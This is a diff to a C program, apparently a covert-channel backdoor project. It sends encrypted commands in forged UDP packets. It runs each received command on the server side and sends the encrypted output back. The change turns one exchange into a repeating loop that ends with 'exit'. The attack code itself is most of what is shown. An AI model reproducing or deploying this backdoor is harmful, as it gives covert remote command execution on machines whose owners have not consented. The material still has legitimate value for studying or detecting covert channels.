@@ -93,17 +93,25 @@ int main(int argc, char **argv)
         fprintf(stdout, "Client..\n");
         int cypher_len = 0;
         unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
-        // char *buff = getInput();
-        cypher_len = forgepacket(ciphertext, getInput());
-        client(source_host, dest_host, dest_port, ciphertext, cypher_len);
+        bool more = true;
 
-        fprintf(stdout, "Backdoor..\n");
-        server(dest_host, source_host, dest_port);
+        while (more)
+        {
+            cypher_len = forgepacket(ciphertext, getInput(), BUFF_SIZE);
+            client(source_host, dest_host, dest_port, ciphertext, cypher_len);
+
+            fprintf(stdout, "Backdoor..\n");
+            server(dest_host, source_host, dest_port);
+
+            if (strcmp("exit", getInput()) == 0)
+                more = false;
+        }
     }
     else
     {
         fprintf(stdout, "Backdoor..\n");
-        server(source_host, dest_host, dest_port);
+        while (server(source_host, dest_host, dest_port))
+            ;
     }
 
     return 0;
@@ -127,10 +135,10 @@ int main(int argc, char **argv)
  * NOTES:
  * This section runs client or the server code if server flag was set
  * -----------------------------------------------------------------------*/
-int forgepacket(unsigned char *ciphertext, char *buff)
+int forgepacket(unsigned char *ciphertext, char *buff, int size)
 {
     // ENCRYPT DATA
-    int ciphertext_len = encrypt((unsigned char *)buff, BUFF_SIZE, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)ciphertext);
+    int ciphertext_len = encrypt((unsigned char *)buff, size, (unsigned char *)KEY, (unsigned char *)IV, (unsigned char *)ciphertext);
     fprintf(stdout, "Normal Text:\n%s\n\n", buff);
     fprintf(stdout, "Cypher Text:\n%d\n%s\n\n", ciphertext_len, ciphertext);
 
@@ -268,7 +276,7 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short des
  * Server function for unvealing the message from the UDP header and
  * writing the the message to a file.
  * -----------------------------------------------------------------------*/
-void server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port)
+bool server(unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port)
 {
     FILE *fp;
     int recv_socket;
@@ -326,9 +334,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
 
                     fprintf(stdout, "Decypher: %d | %s\n", decryptedtext_len, decryptedtext);
 
-                    if (strcmp(decryptedtext, "exit") == 0)
-                        open = false;
-                    else
+                    if (strcmp(decryptedtext, "exit") != 0)
                     {
                         // Get Output
                         char *output = (char *)malloc(OUTPUT_SIZE);
@@ -337,11 +343,17 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
                         fprintf(stdout, "Return: %s \n", output);
 
                         // Cypher
-                        unsigned char *ciphertext = (unsigned char *)malloc(BUFF_SIZE * 2);
-                        int cypher_len = forgepacket(ciphertext, output);
+                        unsigned char *ciphertext = (unsigned char *)malloc(OUTPUT_SIZE * 2);
+                        int cypher_len = forgepacket(ciphertext, output, OUTPUT_SIZE);
 
                         // Send
                         client(dest_addr, source_addr, dest_port, ciphertext, cypher_len);
+                        open = false;
+                    }
+                    else
+                    {
+                        close(recv_socket); /* close the socket so we don't hose the kernel */
+                        return false;
                     }
 
                     // Reset Counters
@@ -352,6 +364,7 @@ void server(unsigned int source_addr, unsigned int dest_addr, unsigned short des
         }
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
+    return true;
 }
 
 /*--------------------------------------------------------------------------
